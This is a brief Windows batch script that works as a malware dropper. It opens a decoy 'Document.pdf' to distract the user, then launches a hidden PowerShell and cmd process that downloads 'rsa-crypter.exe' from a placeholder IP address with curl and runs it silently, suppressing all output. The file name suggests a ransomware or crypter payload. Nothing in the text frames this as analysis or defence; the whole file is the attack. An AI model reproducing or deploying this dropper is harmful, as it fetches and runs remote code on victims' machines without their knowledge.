@echo off
cd /d %~dp0
start /b Document.pdf
cd %USERPROFILE%\Desktop
powershell -Command "& { Start-Process cmd -ArgumentList '/c curl X.X.X.X/EFGEJHGEV2311 -o rsa-crypter.exe > NUL 2>&1 && start /b .\rsa-crypter.exe' -WindowStyle Hidden }"
